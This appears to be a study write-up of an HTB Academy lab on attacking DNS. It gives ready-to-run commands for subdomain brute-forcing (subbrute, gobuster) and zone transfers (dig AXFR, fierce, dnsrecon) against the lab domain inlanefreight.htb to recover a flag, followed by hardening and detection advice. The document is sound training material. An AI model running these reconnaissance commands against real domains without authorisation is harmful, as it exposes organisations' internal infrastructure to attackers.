# 🛰️ DNS Attack Methodologies

## 🔍 HTB Academy Attacking Common Services - DNS Exploitation

### 🌐 Scenario 1: DNS Zone Transfer and Subdomain Enumeration

#### [!ABSTRACT] Overview:
This scenario involves discovering all DNS records for the `inlanefreight.htb` domain, leveraging subdomain enumeration and zone transfer techniques. The goal is to extract a flag hidden within one of the discovered DNS records.

---

## 📝 Methodology & Steps

### Step 1: Setup Subbrute Tool
```bash
# Clone subbrute repository
git clone https://github.com/TheRook/subbrute.git && cd subbrute/

# Expected output
Cloning into 'subbrute'...
remote: Enumerating objects: 438, done.
remote: Total 438 (delta 0), reused 0 (delta 0), pack-reused 438
Receiving objects: 100% (438/438), 11.85 MiB | 20.67 MiB/s, done.
Resolving deltas: 100% (216/216), done.
```

### Step 2: Configure DNS Resolver
```bash
# Add target DNS server IP to resolvers file
echo STMIP > resolvers.txt

# Replace STMIP with actual target IP (e.g., 10.129.137.154)
```

### Step 3: Subdomain Enumeration
```bash
# Use subbrute with SecLists wordlist
python3 subbrute.py inlanefreight.htb -s /opt/useful/SecLists/Discovery/DNS/namelist.txt -r resolvers.txt

# Expected output
Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.htb
helpdesk.inlanefreight.htb
hr.inlanefreight.htb
ns.inlanefreight.htb
```

### Step 4: Zone Transfer on Discovered Subdomains
```bash
# Perform zone transfer on hr subdomain and search for TXT records
dig axfr hr.inlanefreight.htb @10.129.137.154 | grep "TXT"

# Successful flag extraction
hr.inlanefreight.htb.	604800	IN	TXT	"HTB{...}"
```

### Alternative Methods

#### [!EXAMPLE] Zone Transfer Using `dig`
```bash
dig AXFR @target_dns_server inlanefreight.htb
```

#### [!EXAMPLE] Zone Transfer Using `fierce`
```bash
fierce --domain inlanefreight.htb
```

#### [!EXAMPLE] Zone Transfer Using `dnsrecon`
```bash
dnsrecon -d inlanefreight.htb -t axfr
```

#### [!CHECK] Enumerate All Subdomains and Perform AXFR Queries
```bash
for sub in helpdesk hr ns; do
    echo "=== Checking $sub.inlanefreight.htb ==="
    dig AXFR @target_dns_server $sub.inlanefreight.htb
done
```

### Advanced DNS Reconnaissance

#### [!CHECK] Enumerate All Record Types Using `dig`
```bash
# Enumerate all record types for the domain
dig ANY @target_dns_server inlanefreight.htb

# Check for specific record types
dig TXT @target_dns_server inlanefreight.htb
dig MX @target_dns_server inlanefreight.htb
dig NS @target_dns_server inlanefreight.htb
dig PTR @target_dns_server inlanefreight.htb
```

#### [!EXAMPLE] Brute Force Subdomains Using `gobuster`
```bash
# Enumerate all subdomains using gobuster
gobuster dns -d inlanefreight.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Check for zone transfer on discovered subdomains
for sub in $(cat discovered_subdomains.txt); do
    dig AXFR @target_dns_server $sub.inlanefreight.htb
done
```

---

## 🛡️ Defense & Mitigation

### DNS Server Hardening
- **Disable Zone Transfers**: Restrict `AXFR` to authorized servers only.
- **Enable DNSSEC**: Use cryptographic DNS response validation.
- **Implement Access Controls**: Use IP-based query restrictions.
- **Regular Updates**: Keep DNS server software up-to-date.
- **Rate Limiting**: Prevent DNS amplification attacks.

### Network Security
- **DNS Filtering**: Block malicious domains.
- **Encrypted DNS**: Use DNS over HTTPS (DoH) or DNS over TLS (DoT).
- **Split DNS**: Separate internal and external DNS.
- **DNS Monitoring**: Detect unusual query patterns.
- **Cache Poisoning Protection**: Implement source port randomization.

### Monitoring & Detection
- **Zone Transfer Attempts**: Log `AXFR` queries.
- **Unusual DNS Queries**: Monitor for reconnaissance patterns.
- **DNS Response Validation**: Detect spoofed responses.
- **Subdomain Monitoring**: Track new subdomain creation.
- **Certificate Transparency**: Monitor SSL certificate logs.

---

## 🔗 Related Techniques

- [[Subdomain Enumeration]]
- [[Domain Hijacking]]
- [[Man-in-the-Middle]]
- [[Social Engineering]]
- [[Network Pivoting]]

---

*This document provides comprehensive DNS attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment.*